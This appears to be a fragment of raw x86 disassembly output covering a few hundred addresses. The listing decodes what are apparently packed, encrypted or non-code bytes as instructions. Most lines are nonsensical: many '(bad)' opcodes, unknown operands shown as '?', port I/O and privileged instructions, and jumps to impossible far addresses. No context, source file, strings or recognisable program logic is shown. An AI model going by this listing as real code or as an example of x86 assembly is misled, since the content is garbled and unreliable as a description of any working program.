  41747e:	and    bh,ch
  417480:	pop    edx
  417481:	inc    edi
  417482:	jbe    0x41744f
  417484:	in     al,dx
  417485:	pop    eax
  417486:	mov    BYTE PTR [ebp-0x30],al
  417489:	mov    WORD PTR [ecx-0x1fd45f48],es
  41748f:	ret    0x887d
  417492:	lahf   
  417493:	push   ds
  417494:	in     eax,dx
  417495:	mov    ch,0xb6
  417497:	and    eax,0xeb87a8cd
  41749c:	jb     0x41744f
  41749e:	icebp  
  41749f:	retf   
  4174a0:	lds    esp,FWORD PTR [edx]
  4174a2:	scas   al,BYTE PTR es:[edi]
  4174a3:	sub    eax,esi
  4174a5:	sub    DWORD PTR [edi],ecx
  4174a7:	push   edx
  4174a8:	ret    
  4174a9:	faddp  st(5),st
  4174ab:	pop    esp
  4174ac:	jns    0x41745f
  4174ae:	jno    0x41751d
  4174b0:	sub    BYTE PTR [ecx+esi*8],0xc
  4174b4:	add    ebp,DWORD PTR [edi-0x1753826c]
  4174ba:	js     0x417444
  4174bc:	fist   DWORD PTR [esi-0x4a222414]
  4174c2:	aaa    
  4174c3:	int3   
  4174c4:	push   esp
  4174c5:	pop    ecx
  4174c6:	jge    0x417490
  4174c8:	dec    ebp
  4174c9:	inc    edx
  4174ca:	pusha  
  4174cb:	pop    ebp
  4174cc:	jle    0x417516
  4174ce:	sub    bl,cl
  4174d0:	adc    DWORD PTR [esi+0x40],0xb772c370
  4174d7:	mov    ?,WORD PTR [edi+0x75]
  4174da:	sub    bh,dh
  4174dc:	xchg   ecx,eax
  4174dd:	pop    es
  4174de:	call   0x5e836bf0
  4174e3:	sti    
  4174e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174e5:	mov    ah,0xc4
  4174e7:	out    0x9,al
  4174e9:	and    ecx,DWORD PTR ds:0xf1a0e107
  4174ef:	cwde   
  4174f0:	(bad)  
  4174f1:	fild   QWORD PTR [edx-0x35a127fc]
  4174f7:	(bad)  
  4174f8:	dec    edi
  4174f9:	add    ah,BYTE PTR [eax]
  4174fb:	addr16 dec edx
  4174fd:	adc    eax,0x7f0defe3
  417502:	mov    eax,ds:0xae9f4f2e
  417507:	jp     0x41750f
  417509:	pusha  
  41750a:	ja     0x41754c
  41750c:	mov    ds:0x94e1a0b4,eax
  417511:	inc    esp
  417512:	retf   
  417513:	sub    al,BYTE PTR [edx-0x6f]
  417516:	adc    eax,0xcdeab15f
  41751b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41751c:	ret    0xf56f
  41751f:	mov    edx,eax
  417521:	jno    0x417509
  417523:	ins    BYTE PTR es:[edi],dx
  417524:	ret    
  417525:	nop
  417526:	mov    ?,ebx
  417528:	mov    ch,0xbb
  41752a:	cli    
  41752b:	push   cs
  41752c:	inc    ebp
  41752d:	dec    eax
  41752e:	mov    al,ds:0x819d3ce2
  417533:	fs daa 
  417535:	push   edx
  417536:	std    
  417537:	mov    al,BYTE PTR [ebp+edx*4+0x720e67c3]
  41753e:	xchg   BYTE PTR [edi+0x4427fb56],ah
  417544:	mov    ebx,0x9267131d
  417549:	clc    
  41754a:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41754c:	cmp    al,0x86
  41754e:	adc    al,0x44
  417550:	push   esi
  417551:	ss xchg ebp,eax
  417553:	jmp    0xdbd15f63
  417558:	adc    esi,DWORD PTR [ebx-0x4aa3d70d]
  41755e:	xor    DWORD PTR [ecx],0x25
  417561:	mov    al,ds:0x967c7a3f
  417566:	sub    BYTE PTR [eax+0x36b25480],dh
  41756c:	std    
  41756d:	lock add DWORD PTR [ecx+0x7d],0xb
  417572:	sar    BYTE PTR [ecx],1
  417574:	jo     0x417529
  417576:	iret   
  417577:	hlt    
  417578:	pop    edi
  417579:	aam    0x10
  41757b:	mov    esp,0xe15699a6
  417580:	jbe    0x4175c1
  417582:	or     DWORD PTR [esi+edx*1],ebx
  417585:	xlat   BYTE PTR ds:[ebx]
  417586:	sbb    al,0x63
  417588:	mov    cl,0x75
  41758a:	pop    edi
  41758b:	pop    ss
  41758c:	dec    ecx
  41758d:	call   0x530c:0x68318e18
  417594:	mov    DWORD PTR [edx],ecx
  417596:	mov    dl,0xb2
  417598:	ror    BYTE PTR [ebp+0x2e],cl
  41759b:	fwait
  41759c:	std    
  41759d:	dec    edi
  41759e:	pop    eax
  41759f:	or     bl,BYTE PTR [edi+0x7e2df167]
  4175a5:	mov    eax,ds:0xd05ab07d
  4175aa:	sub    eax,0x68cfdabf
  4175af:	ficomp DWORD PTR [ecx+ebp*4+0x17]
  4175b3:	adc    eax,0x5ae1c126
  4175b8:	mov    ecx,0xdfd67b56
  4175bd:	jmp    0x417585
  4175bf:	fs dec esi
  4175c1:	mov    edx,0x6d2e108a
  4175c6:	pop    esi
  4175c7:	fwait
  4175c8:	push   es
  4175c9:	pop    esp
  4175ca:	iret   
  4175cb:	xlat   BYTE PTR ds:[ebx]
  4175cc:	mov    bl,0x72
  4175ce:	pop    ebx
  4175cf:	std    
  4175d0:	jl     0x417616
  4175d2:	mov    edx,DWORD PTR [edi+0x7ccccd1c]
  4175d8:	xchg   ecx,eax
  4175d9:	adc    ah,al
  4175db:	shr    BYTE PTR [ecx+ecx*4+0x54],0x62
  4175e0:	adc    DWORD PTR [eax-0x4ccf86fa],eax
  4175e6:	repz out dx,al
  4175e8:	or     BYTE PTR [edx-0x6d],bh
  4175eb:	xchg   esp,eax
  4175ec:	push   0x43
  4175ee:	jnp    0x417579
  4175f0:	retf   
  4175f1:	fild   WORD PTR [eax+edx*2+0x21]
  4175f5:	cmp    edi,DWORD PTR [esi+0x5f]
  4175f8:	lock retf 
  4175fa:	or     DWORD PTR [ebx+0x9],esi
  4175fd:	lods   eax,DWORD PTR ds:[esi]
  4175fe:	pop    edx
  4175ff:	fwait
  417600:	pop    edi
  417601:	adc    al,0x0
  417603:	push   0xffffff92
  417605:	or     BYTE PTR [ebp+0x31dfcf27],0xdc
  41760c:	cdq    
  41760d:	shr    DWORD PTR [ecx],1
  41760f:	fist   DWORD PTR [ecx-0x649681e0]
  417615:	bound  ecx,QWORD PTR [edx]
  417617:	iret   
  417618:	sahf   
  417619:	sbb    al,0xd8
  41761b:	outs   dx,BYTE PTR ds:[esi]
  41761c:	ins    BYTE PTR es:[edi],dx
  41761d:	push   esp
  41761e:	lock es jmp 0x41765a
  417622:	test   DWORD PTR [eax],edi
  417624:	xor    esp,esp
  417626:	mov    ch,0xd3
  417628:	pop    esi
  417629:	out    dx,eax
  41762a:	pop    eax
  41762b:	mov    eax,0x4f330012
  417630:	mov    DWORD PTR [edi+0x23],ebp
  417633:	xlat   BYTE PTR ds:[ebx]
  417634:	xchg   esp,eax
  417635:	xchg   ebx,eax
  417636:	push   esi
  417637:	aad    0x6c
  417639:	or     ebp,esi
  41763b:	mov    esp,0x328cf0b8
  417640:	xor    edi,DWORD PTR [ecx-0x4a]
  417643:	and    cl,BYTE PTR [ebp+0x1968e95f]
  417649:	lahf   
  41764a:	add    ecx,DWORD PTR [edi+0xf5773b5]
  417650:	pusha  
  417651:	sub    eax,0x93d2ab32
  417656:	repnz sub BYTE PTR [edx+eiz*8-0x26f852a0],0x36
  41765f:	mov    ebx,0xa9b3bd4c
  417664:	(bad)  
  417665:	xor    DWORD PTR [ecx+0x4bcf7b7b],ebx
  41766b:	fistp  QWORD PTR [eax+0x5213a1b2]
  417671:	push   es
  417672:	add    BYTE PTR [esi-0x4d],0x57
  417676:	mov    dl,0xfd
  417678:	xor    BYTE PTR [eax],cl
  41767a:	loop   0x4176dc
  41767c:	pop    eax
  41767d:	mov    esi,0xc7897a1c
  417682:	data16 (bad) 
  417685:	mov    ds:0x21c7f295,eax
  41768a:	cmp    eax,0xdfe6d3c4
  41768f:	iret   
  417690:	push   0xd671021d
  417695:	pop    ebp
  417696:	and    al,0xa3
  417698:	adc    al,0x17
  41769a:	dec    eax
  41769b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41769c:	aad    0xd5
  41769e:	popf   
  41769f:	out    0x1e,eax
  4176a1:	and    BYTE PTR [eax+0x42b5dedf],dl
  4176a7:	lods   eax,DWORD PTR ds:[esi]
  4176a8:	cdq    
  4176a9:	mov    bl,0xd2
  4176ab:	cdq    
  4176ac:	cdq    
  4176ad:	xchg   esp,eax
  4176ae:	pop    eax
  4176af:	cmp    BYTE PTR [ebp+0x1f20897f],bl
  4176b5:	enter  0x34cb,0x34
  4176b9:	or     BYTE PTR ss:[ebx+0xcda0628],dh
  4176c0:	(bad)  
  4176c1:	pop    ds
  4176c2:	xchg   edx,eax
  4176c3:	ret    0x80b2
  4176c6:	or     al,0xb3
  4176c8:	(bad)  
  4176c9:	in     eax,dx
  4176ca:	sub    dh,al
  4176cc:	loope  0x417675
  4176ce:	lods   al,BYTE PTR ds:[esi]
  4176cf:	rcr    BYTE PTR [eax],0xe5
  4176d2:	lock out 0x78,eax
  4176d5:	adc    DWORD PTR [ebx+0x17],ecx
  4176d8:	aad    0xa5
  4176da:	popa   
  4176db:	loope  0x4176dd
  4176dd:	fisub  WORD PTR [edx]
  4176df:	and    al,0xdf
  4176e1:	mov    ds:0xd034b582,eax
  4176e6:	inc    ecx
  4176e7:	add    DWORD PTR [ebx+0xf05669d],ebx
  4176ed:	les    eax,FWORD PTR [eax]
  4176ef:	aaa    
  4176f0:	push   esp
  4176f1:	xlat   BYTE PTR ds:[ebx]
  4176f2:	xor    dl,dl
  4176f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176f5:	mov    ebp,0xc2d144f5
  4176fa:	push   0xffffff8f
  4176fc:	rcr    ecx,cl
  4176fe:	mov    gs,esi
  417700:	cmp    esp,DWORD PTR [ecx]
  417702:	add    al,0x58
  417704:	pop    ss
  417705:	repnz xchg edi,eax
  417707:	add    BYTE PTR [esi+0x7],0xe3
  41770b:	ja     0x417700
  41770d:	dec    eax
  41770e:	shr    BYTE PTR ds:[ebp-0x167f8546],1
  417715:	jmp    0x4ee59183
  41771a:	lock in eax,0xa
  41771d:	mov    bh,0x4b
  41771f:	int    0xda
  417721:	aaa    
  417722:	test   BYTE PTR [ecx],bh
  417724:	in     al,0xd3
  417726:	shl    BYTE PTR [eax-0x13],0x93
  41772a:	push   ebx
  41772b:	inc    esi
  41772c:	fwait
  41772d:	pushf  
  41772e:	jne    0x41773f
  417730:	mov    bh,BYTE PTR [ecx-0x79]
  417733:	pop    ss
  417734:	xor    al,0xf8
  417737:	xor    DWORD PTR [edi],ebp
  417739:	sbb    eax,0x293888c5
  41773e:	adc    al,0xfb
  417740:	sbb    al,0xd6
  417742:	jae    0x417776
  417744:	lods   al,BYTE PTR ds:[esi]
  417745:	out    0xa6,al
  417747:	xor    eax,0x6b49805f
  41774c:	in     eax,dx
  41774d:	inc    edx
  41774e:	inc    eax
  41774f:	pop    edx
  417750:	outs   dx,BYTE PTR ds:[esi]
  417751:	scas   eax,DWORD PTR es:[edi]
  417752:	xor    DWORD PTR [bx+di-0x619d],eax
  417757:	cmp    ah,BYTE PTR [esi-0x6e]
  41775a:	cmp    eax,0x67b998fe
  41775f:	retf   
  417760:	dec    esp
  417761:	xor    al,0xa1
  417763:	mov    dl,0x1e
  417765:	add    BYTE PTR [ebp+0x4c],bh
  417768:	push   edx
  417769:	loopne 0x417739
  41776b:	mov    bh,0x4f
  41776d:	test   eax,0x539aa81d
  417772:	mov    esi,0x7dc51c1
  417777:	lds    edi,FWORD PTR [edx+0x308d294c]
  41777d:	inc    esi
  41777e:	ins    DWORD PTR es:[edi],dx
  41777f:	mov    DWORD PTR [edi-0xb],ecx
  417782:	mov    ecx,0xf08b00cf
  417787:	into   
  417788:	call   0xf4a8a0f4
  41778d:	add    eax,DWORD PTR [esi-0x899d5f6]
  417793:	jae    0x4177c6
  417795:	imul   ebx,edi,0x52d811d9
  41779b:	push   ecx
  41779c:	outs   dx,BYTE PTR ds:[esi]
  41779d:	loopne 0x417801
  41779f:	sub    BYTE PTR [edx],ah
  4177a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177a2:	scas   al,BYTE PTR es:[edi]
  4177a3:	xchg   ebx,eax
  4177a4:	ins    DWORD PTR es:[edi],dx
  4177a5:	ror    DWORD PTR [edx-0x55],cl
  4177a8:	ins    DWORD PTR es:[edi],dx
  4177a9:	hlt    
  4177aa:	aad    0xf7
  4177ac:	xor    edi,DWORD PTR [esi+0x2a]
  4177af:	cmc    
  4177b0:	dec    ebx
  4177b1:	jecxz  0x4177e8
  4177b3:	jno    0x41782a
  4177b5:	jge    0x41779e
  4177b7:	test   DWORD PTR [edi-0x73],ebx
  4177ba:	bound  edx,QWORD PTR [edx+0x43]
  4177bd:	jle    0x417802
  4177bf:	(bad)  
  4177c0:	dec    edx
  4177c1:	mov    ss,WORD PTR [esi]
  4177c3:	shl    BYTE PTR [esi+0x74],cl
  4177c6:	add    ecx,ebx
  4177c8:	push   ss
  4177c9:	mov    ah,0x62
  4177cb:	mov    al,0x58
  4177cd:	out    0x4f,eax
  4177cf:	adc    ch,dh
  4177d1:	pop    ds
  4177d2:	cdq    
  4177d3:	inc    ecx
  4177d4:	mov    esi,0x4fc588ac
  4177d9:	je     0x41778f
  4177db:	inc    edi
  4177dc:	scas   al,BYTE PTR es:[edi]
  4177dd:	idiv   DWORD PTR ss:[eax]
  4177e0:	push   edi
  4177e1:	mov    WORD PTR [ecx-0x30],?
  4177e4:	pop    edi
  4177e5:	idiv   BYTE PTR ds:0x4daaab7d
  4177eb:	fnstcw WORD PTR [ecx+0x62]
  4177ee:	loopne 0x4177f4
  4177f0:	push   eax
  4177f1:	pusha  
  4177f2:	adc    BYTE PTR [edx],ah
  4177f4:	inc    ecx
  4177f5:	call   0xe78dfb1c
  4177fa:	mov    BYTE PTR [eax+0x2d],cl
  4177fd:	rol    ecx,1
  4177ff:	xchg   ebp,eax
  417800:	hlt    
  417801:	mov    ah,al
  417803:	call   0x73dd:0x365b54fe
  41780a:	mov    dh,0xb8
  41780c:	inc    ebx
  41780d:	fild   QWORD PTR [esp+edi*2-0x46]
  417811:	aad    0x7
  417813:	push   es
  417814:	inc    ebp
  417815:	pop    esi
  417816:	mov    DWORD PTR [esi+0x1b],esp
  417819:	dec    edx
  41781a:	dec    ebx
  41781b:	mov    WORD PTR [ecx-0xf],fs
  41781e:	lea    esp,[edx]
  417820:	mov    ds:0x32fc5bb0,eax
  417825:	pusha  
  417826:	aam    0x41
  417828:	add    esp,DWORD PTR [ecx]
  41782a:	outs   dx,DWORD PTR ds:[esi]
  41782b:	add    DWORD PTR [ecx+0x60af5002],esp
  417831:	jmp    DWORD PTR [ebx]
  417833:	adc    al,0xf7
  417835:	adc    BYTE PTR [eax+0x4d],ch
  417838:	xchg   ebx,eax
  417839:	sub    ch,al
  41783b:	aad    0x4e
  41783d:	stos   BYTE PTR es:[edi],al
  41783e:	or     DWORD PTR [ecx+0x1],esp
  417841:	sub    al,0xed
  417843:	adc    esp,edx
  417845:	and    eax,edi
  417847:	sbb    ah,ch
  417849:	dec    BYTE PTR [ecx]
  41784b:	sbb    DWORD PTR [ebx+0x5fb8a027],esp
  417851:	xor    cl,BYTE PTR [ecx+edx*1-0x7b]
  417855:	sti    
  417856:	mov    al,ds:0x175b4ef5
  41785b:	outs   dx,DWORD PTR ds:[esi]
  41785c:	sub    al,0x1a
  41785e:	je     0x417880
  417860:	push   edi
  417861:	pop    ecx
  417862:	ins    DWORD PTR es:[edi],dx
  417863:	jge    0x41784e
  417865:	je     0x4178b7
  417867:	call   0xfaa00a0f
  41786c:	fisub  DWORD PTR [ebx-0xd]
  41786f:	xchg   edx,eax
  417870:	cmp    dl,dl
  417872:	and    ecx,DWORD PTR [eax+0xe]
  417875:	sbb    dl,cl
  417877:	mov    edx,DWORD PTR [esi+0x1239ad67]
  41787d:	mov    ecx,0x8915eb3a
  417882:	into   
  417883:	dec    ecx
  417884:	shr    edi,cl
  417886:	jmp    0x417876
  417888:	sbb    ebp,DWORD PTR ds:0x98a9efae
  41788e:	jbe    0x41781b
  417890:	fimul  DWORD PTR [ebp-0x3145a90]
  417896:	int    0x77
  417898:	mov    ah,0xd3
  41789a:	mov    ah,BYTE PTR [eax+0x4e]
  41789d:	aas    
  41789e:	dec    ebx
  41789f:	out    0x95,al
  4178a1:	pushf  
  4178a2:	dec    edi
  4178a3:	jnp    0x4178db
  4178a5:	sub    eax,0x5d404da9
  4178aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178ab:	cmp    DWORD PTR [esp+eiz*2+0x76cb2d71],0xffffffbd
  4178b3:	test   DWORD PTR [esi+ebx*2-0x4b4f3ad9],esi
  4178ba:	push   ebp
  4178bb:	jl     0x4178cd
  4178bd:	lahf   
  4178be:	fs adc eax,0xa097059f
  4178c4:	mov    ebp,0xb7fe3cd8
  4178c9:	inc    esi
  4178ca:	test   al,0x6e
  4178cc:	dec    ebx
  4178cd:	shl    DWORD PTR [ebx+0x63],0xe1
  4178d1:	xor    al,0xce
  4178d3:	sub    ch,BYTE PTR [ecx]
  4178d5:	push   esp
  4178d6:	xchg   BYTE PTR [ecx+0x41],dl
  4178d9:	aad    0x97
  4178db:	xchg   eax,edi
  4178dd:	push   ss
  4178de:	adc    al,0x3b
  4178e0:	sbb    eax,0x89d4831e
  4178e5:	mov    esi,0x348c5016
  4178ea:	push   ss
  4178eb:	inc    esi
  4178ec:	or     eax,DWORD PTR [ebx]
  4178ee:	clc    
  4178ef:	sti    
  4178f0:	les    eax,FWORD PTR [edx]
  4178f2:	fwait
  4178f3:	mov    BYTE PTR [ebp+0x366dcfbf],ch
  4178f9:	mov    eax,0x921747
  4178fe:	xor    ch,0x14
  417901:	in     al,dx
  417902:	cs mov dh,0x94
  417905:	(bad)  
  417906:	mov    ds:0x476cc412,al
  41790b:	add    eax,0x3d323317
  417910:	jmp    0xccf2:0xf231972c
  417917:	out    dx,al
  417918:	sahf   
  417919:	ret    
  41791a:	shl    BYTE PTR [ebp+0x2a],cl
  41791d:	(bad)
  417920:	(bad)  
  417921:	mov    eax,ds:0x8292fcc3
  417926:	pusha  
  417927:	or     esp,DWORD PTR [edi-0x602fcc82]
  41792d:	sub    al,BYTE PTR [edx]
  41792f:	stos   BYTE PTR es:[edi],al
  417930:	shl    DWORD PTR [edx+0x774d76f5],cl
  417936:	pop    ebx
  417937:	sar    DWORD PTR [edi-0x3e],0xef
  41793b:	fild   QWORD PTR [edx+0x4]
  41793e:	mov    ch,0xf5
  417940:	and    BYTE PTR [edx],cl
  417942:	push   0xcb8321a7
  417947:	inc    esi
  417948:	fmul   st(2),st
  41794a:	jle    0x417993
  41794c:	ret    0x8bc3
  41794f:	test   eax,0x51730174
  417954:	inc    edx
  417955:	jb     0x4179ba
  417957:	xchg   ecx,eax
  417958:	outs   dx,DWORD PTR ds:[esi]
  417959:	or     BYTE PTR [edx+0x3a2930b0],dl
  41795f:	daa    
  417960:	popf   
  417961:	cmp    bl,al
  417963:	sbb    DWORD PTR [esi],esi
  417965:	adc    DWORD PTR [esp+ecx*8],edx
  417968:	enter  0x622c,0x2
  41796c:	ret    
  41796d:	jns    0x41796e
  41796f:	pusha  
  417970:	mov    edi,0x2bc478b7
  417975:	xchg   ebp,eax
  417976:	(bad)  
  417977:	js     0x41790d
  417979:	pop    ds
  41797a:	fsub   st(3),st
  41797c:	mov    WORD PTR [esi],ds
  41797e:	inc    esi
  41797f:	imul   edx,DWORD PTR [edi-0x66],0xffffffdb
  417983:	push   edi
  417984:	cs adc ebx,edx
  417987:	imul   esi,DWORD PTR [ecx-0xe],0x1b4a734e
  41798e:	cdq    
  41798f:	pop    ecx
  417990:	xor    ebx,0xd2ec6f37
  417996:	dec    edi
  417997:	js     0x417989
  417999:	addr16 jno 0x417a19
  41799c:	iret   
  41799d:	mov    DWORD PTR [ecx-0x47],esp
  4179a0:	mov    edx,0x73e2b89e
  4179a5:	mov    al,0xa8
  4179a7:	icebp  
  4179a8:	adc    al,0xb1
  4179aa:	(bad)  
  4179ab:	or     al,0x7
  4179ad:	jns    0x41794a
  4179af:	sbb    dl,BYTE PTR [edx-0x29ef435d]
  4179b5:	out    0x9d,al
  4179b7:	mov    dh,al
  4179b9:	mov    esi,ss
  4179bb:	sar    DWORD PTR ds:0x167e50a3,0x36
  4179c2:	xor    al,0x44
  4179c4:	xor    ch,al
  4179c6:	pop    ss
  4179c7:	xchg   esi,eax
  4179c8:	gs xchg edx,eax
  4179ca:	add    DWORD PTR [ebx+0x45],ecx
  4179cd:	inc    eax
  4179ce:	inc    ebp
  4179cf:	and    eax,0x4cc61629
  4179d4:	out    dx,eax
  4179d5:	cwde   
  4179d6:	dec    ebx
  4179d7:	(bad)  
  4179d8:	sbb    BYTE PTR [ecx+0x3f],dh
  4179db:	xchg   edx,eax
  4179dc:	nop
  4179dd:	ja     0x417a4e
  4179df:	jbe    0x417a5b
  4179e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179e2:	or     al,0xf0
  4179e4:	pop    ebx
  4179e5:	mov    ch,0xa1
  4179e7:	iret   
  4179e8:	mov    esp,0x31a20f98
  4179ed:	pusha  
  4179ee:	xchg   edx,eax
  4179ef:	dec    eax
  4179f0:	jbe    0x417a1e
  4179f2:	retf   
  4179f3:	icebp  
  4179f4:	frstor [ebp-0x5b]
  4179f7:	jns    0x417a07
  4179f9:	fmul   DWORD PTR [ebx+eax*4]
  4179fc:	mul    esp
  4179fe:	popf   
  4179ff:	mov    ch,0x71
  417a01:	adc    DWORD PTR [ebp-0x6a],esi
  417a04:	sar    bh,cl
  417a06:	or     ebp,0xffffffed
  417a09:	pop    ds
  417a0a:	mov    dl,0xc2
  417a0c:	gs cld 
  417a0e:	stos   BYTE PTR es:[edi],al
  417a0f:	in     al,0xd6
  417a11:	cmc    
  417a12:	sub    BYTE PTR [ecx+0xbcd27c9],bh
  417a18:	cmp    bl,BYTE PTR [edx-0x2]
  417a1b:	xor    ch,BYTE PTR [eax+0x44]
  417a1e:	stc    
  417a1f:	sti    
  417a20:	shl    DWORD PTR [edi],1
  417a22:	jmp    0x4bc8c503
  417a27:	ins    BYTE PTR es:[edi],dx
  417a28:	xor    ah,BYTE PTR [ecx+0x7]
  417a2b:	nop
  417a2c:	fnsave [eax-0x29]
  417a2f:	loop   0x417a8d
  417a31:	push   edx
  417a32:	cmp    bl,BYTE PTR [edx-0x19e0b91e]
  417a38:	pop    edi
  417a39:	add    BYTE PTR [esi+0x7a],0xf8
  417a3d:	cli    
  417a3e:	cmp    dl,bh
  417a40:	xor    ch,bl
  417a42:	lds    edi,FWORD PTR [ecx+0x634de3ff]
  417a48:	test   ecx,ebp
  417a4a:	adc    DWORD PTR [ebp+0x6834b66],ecx
  417a50:	pop    ss
  417a51:	and    bh,BYTE PTR [edi+0x2baf93da]
  417a57:	push   cs
  417a58:	fcom   DWORD PTR [ebp+0x61]
  417a5b:	mov    ah,0xd5
  417a5d:	imul   edi,DWORD PTR [esi],0xffffff80
  417a60:	lds    ebp,FWORD PTR [edx]
  417a62:	or     al,0x7d
  417a64:	in     eax,dx
  417a65:	or     eax,0x399d30ff
  417a6a:	cmc    
  417a6b:	(bad)  
  417a6c:	ficomp DWORD PTR [ebx+esi*8+0x79efe548]
  417a73:	lods   eax,DWORD PTR ds:[esi]
  417a74:	dec    ebx
  417a75:	mov    ebx,0xa0ea6029
  417a7a:	pop    edx
  417a7b:	js     0x417a28
  417a7d:	and    ch,BYTE PTR [ebx+0x71d0528a]
  417a83:	test   al,0x19
  417a85:	(bad)  
  417a86:	sbb    bh,bl
  417a88:	mov    edx,ecx
  417a8a:	mov    ds:0x19ed1356,al
  417a8f:	mov    al,0x80
  417a91:	rcr    BYTE PTR [ebx],cl
  417a93:	adc    al,0x9a
  417a95:	pop    es
  417a96:	mov    WORD PTR [edx-0x30ba7ebe],ds
  417a9c:	popf   
  417a9d:	stos   BYTE PTR es:[edi],al
  417a9e:	ins    BYTE PTR es:[edi],dx
  417a9f:	iret   
  417aa0:	gs ins DWORD PTR es:[edi],dx
  417aa2:	jle    0x417a45
  417aa4:	adc    BYTE PTR [eax+0x33],dh
  417aa7:	shr    dl,cl
  417aa9:	test   ch,dh
  417aab:	inc    ebp
  417aac:	test   BYTE PTR [eax],dh
  417aae:	aad    0xe8
  417ab0:	in     eax,0x44
  417ab2:	ins    DWORD PTR es:[di],dx
  417ab4:	xrelease mov DWORD PTR [ebx-0x6a6dbaec],esi
  417abb:	add    eax,0xffffffd9
  417abe:	fwait
  417abf:	ret    0x3ee2
  417ac2:	dec    edx
  417ac3:	ds push ds
  417ac5:	sub    DWORD PTR [edx-0x6],ecx
  417ac8:	jns    0x417a53
  417aca:	sbb    dl,BYTE PTR [ebp-0xc]
  417acd:	test   al,0x7c
  417acf:	xchg   ax,ax
  417ad1:	out    dx,al
  417ad2:	loop   0x417a6a
  417ad4:	push   0xe71dfa3c
  417ad9:	jl     0x417aee
  417adb:	retf   
  417adc:	push   ebp
  417add:	adc    DWORD PTR [edx-0x471feaaa],esi
  417ae3:	xrelease xchg BYTE PTR [ebx-0xe],bh
  417ae7:	leave  
  417ae8:	cwde   
  417ae9:	push   ebx
  417aea:	and    BYTE PTR [edi],dl
  417aec:	jmp    eax
  417aee:	mov    ebx,0x86753ba4
  417af3:	fld    DWORD PTR [esp+eiz*4+0x31]
  417af7:	or     edi,DWORD PTR [ecx]
  417af9:	dec    esp
  417afa:	adc    eax,0x7073f381
  417aff:	loop   0x417b1a
  417b01:	out    0xc1,al
  417b03:	pop    esi
  417b04:	mov    edi,0xafd8f5a5
  417b09:	sahf   
  417b0a:	push   edi
  417b0b:	xor    eax,0x5ecbedc2
  417b10:	pop    ss
  417b11:	scas   eax,DWORD PTR es:[edi]
  417b12:	test   eax,0x43fad298
  417b17:	mov    ecx,0xf15a55cb
  417b1c:	mov    ebx,0x6ab88cfe
  417b21:	scas   al,BYTE PTR es:[edi]
  417b22:	dec    ecx
  417b23:	pop    ds
  417b24:	push   eax
  417b25:	mov    bl,0xe8
  417b27:	int3   
  417b28:	ja     0x417b6f
  417b2a:	call   0x482d7df0
  417b2f:	inc    ebx
  417b30:	shl    BYTE PTR [ebx-0x18f095e9],1
  417b36:	mov    dh,0xce
  417b38:	xor    edi,DWORD PTR [ecx+0x6b]
  417b3b:	iret   
  417b3c:	icebp  
  417b3d:	pop    eax
  417b3e:	pop    edx
  417b3f:	jns    0x417b15
  417b41:	enter  0x2ae9,0xf7
  417b45:	xchg   ebx,eax
  417b46:	sbb    cl,BYTE PTR [ebx-0x6f06c1ba]
  417b4c:	xchg   edx,eax
  417b4d:	push   edx
  417b4e:	xor    ah,dh
  417b50:	cdq    
  417b51:	std    
  417b52:	push   es
  417b53:	mov    esi,0x73621c4d
  417b58:	ss out dx,eax
  417b5a:	gs mov esi,0x2015d342
  417b60:	sub    eax,0x484d81b6
  417b65:	add    BYTE PTR cs:[edi+ebx*4-0xe429036],dh
  417b6d:	cs mov esi,ebx
  417b70:	imul   DWORD PTR [ecx-0x42]
  417b73:	cmp    BYTE PTR [edx-0x3ad1c7d3],cl
  417b79:	xchg   ebx,eax
  417b7a:	and    DWORD PTR [eax+0x21],eax
  417b7d:	popa   
  417b7e:	stos   DWORD PTR es:[edi],eax
  417b7f:	sahf   
  417b80:	add    esi,ecx
  417b82:	xchg   DWORD PTR [eax+0x21],esp
  417b85:	push   edi
  417b86:	(bad)  
  417b87:	out    0x54,al
  417b89:	dec    edi
  417b8a:	mov    dl,BYTE PTR [ecx+0x5c6728ad]
  417b90:	inc    eax
  417b91:	cmp    BYTE PTR [ecx],ah
  417b93:	jne    0x417bc0
  417b95:	or     esi,DWORD PTR [esi-0x361fa5f6]
  417b9b:	push   edi
  417b9c:	dec    ebx
  417b9d:	jg     0x417b76
  417b9f:	jl     0x417b7d
  417ba1:	std    
  417ba2:	fucomip st,st(4)
  417ba4:	adc    BYTE PTR [ebp+0x71a32989],cl
  417baa:	rcr    BYTE PTR [edx+0x15cd24fe],cl
  417bb0:	push   ds
  417bb1:	test   BYTE PTR [ecx+0x4f01d55b],bl
  417bb7:	outs   dx,BYTE PTR ds:[esi]
  417bb8:	mov    esi,0x88af6e95
  417bbd:	xlat   BYTE PTR ds:[ebx]
  417bbe:	and    eax,0x3827ab2b
  417bc3:	mov    dl,0x1b
  417bc5:	dec    edx
  417bc6:	pop    ds
  417bc7:	enter  0xc0a4,0xe4
  417bcb:	sub    dl,al
  417bcd:	std    
  417bce:	lods   eax,DWORD PTR ds:[esi]
  417bcf:	mov    eax,ds:0x16ad8dfb
  417bd4:	out    dx,eax
  417bd5:	xchg   ecx,eax
  417bd6:	pop    edx
  417bd7:	xchg   esi,eax
  417bd8:	push   esp
  417bd9:	adc    ah,BYTE PTR [esi+0x140e599]
  417bdf:	adc    al,ch
  417be1:	mov    ecx,0x580b1e36
  417be6:	ja     0x417c50
  417be8:	cmp    ah,BYTE PTR [eax-0x8]
  417beb:	jbe    0x417bbe
  417bed:	push   ss
  417bee:	fxch   st(5)
  417bf0:	add    BYTE PTR [edx+ebp*4],ch
  417bf3:	xor    ecx,DWORD PTR es:[ecx]
  417bf6:	pop    edi
  417bf7:	mov    ebx,0x544e4d5a
  417bfc:	fld    TBYTE PTR [eax+0x2f]
  417bff:	adc    BYTE PTR [edx+0x1648ff2],dh
  417c05:	mov    ds:0x4abf57a4,al
  417c0a:	mov    bh,0x91
  417c0c:	xor    dl,BYTE PTR [ebx]
  417c0e:	repz sub edx,DWORD PTR [edi]
  417c11:	dec    eax
  417c12:	fwait
  417c13:	push   esi
  417c14:	xlat   BYTE PTR ds:[ebx]
  417c15:	inc    ecx
  417c16:	jae    0x417c2d
  417c18:	nop
